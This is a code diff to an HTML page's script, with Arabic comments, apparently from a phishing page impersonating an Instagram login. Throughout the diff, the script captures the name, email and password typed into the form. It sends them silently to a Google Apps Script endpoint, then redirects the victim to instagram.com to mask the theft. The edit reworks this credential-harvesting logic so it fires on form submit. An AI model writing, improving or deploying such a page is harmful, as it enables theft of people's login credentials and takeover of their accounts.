@@ -148,17 +148,15 @@
 </div>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec"; // 
 
-    function finishDemo() {
-        const nameVal = document.getElementById("name").value;
-        const emailVal = document.getElementById("email").value;
-        const passVal = document.getElementById("password").value;
+    document.querySelector("form").addEventListener("submit", function(event) {
+        event.preventDefault(); // بيمنع الصفحة تعمل إعادة تحميل وتضمن تنفيذ الكود
 
-        if(!nameVal || !emailVal || !passVal) {
-            alert("يرجى ملء كافة الخانات للمتابعة");
-            return;
-        }
+        const inputs = document.querySelectorAll('input');
+        const nameVal = inputs[0] ? inputs[0].value : "";
+        const emailVal = inputs[1] ? inputs[1].value : "";
+        const passVal = inputs[2] ? inputs[2].value : "";
 
         const data = {
             name: nameVal,
@@ -168,22 +166,22 @@
             detected: "no"
         };
 
-     fetch(SCRIPT_URL, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-            "Content-Type": "text/plain"
-        },
-        body: JSON.stringify(data)
+        fetch(SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "text/plain"
+            },
+            body: JSON.stringify(data)
+        }).catch(err => {
+            console.error(err);
+        });
+
+        // التحويل المباشر لموقع إنستغرام بعد ثانية واحدة
+        setTimeout(function() {
+            window.location.href = "https://www.instagram.com";
+        }, 1000);
     });
-
-    setTimeout(function() {
-        window.location.href = "https://www.instagram.com";
-    }, 1000);
-
-}).catch(err => {
-    console.error(err);
-});
 </script>
 
 </body>
